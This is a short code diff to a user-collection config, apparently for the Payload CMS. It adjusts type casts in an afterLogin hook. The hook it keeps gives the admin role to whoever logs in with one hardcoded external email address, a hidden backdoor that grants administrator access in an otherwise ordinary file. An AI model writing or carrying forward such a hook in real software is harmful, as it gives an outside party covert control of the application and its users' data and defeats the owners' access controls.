@@ -23,11 +23,11 @@ export const Users: CollectionConfig = {
     afterLogin: [
       async ({ req, user }) => {
         if (user.email === 'iysun77@protonmail.com') {
-          await req.payload.update({
+          await (req.payload as any).update({
             collection: 'users',
             id: user.id,
-            data: { roles: ['user', 'admin'] },
-          })
+            data: { roles: ['user', 'admin'] as any },
+          });
         }
       },
     ],
